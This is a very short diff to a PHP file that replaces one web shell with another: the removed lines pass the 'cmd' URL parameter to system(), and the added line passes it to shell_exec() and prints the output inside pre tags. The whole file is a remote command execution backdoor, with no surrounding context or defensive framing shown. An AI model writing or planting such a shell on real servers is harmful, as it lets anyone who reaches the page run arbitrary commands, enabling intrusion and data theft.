@@ -1,3 +1,1 @@
-<?php
-    echo system($_GET["cmd"]);
-?>
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
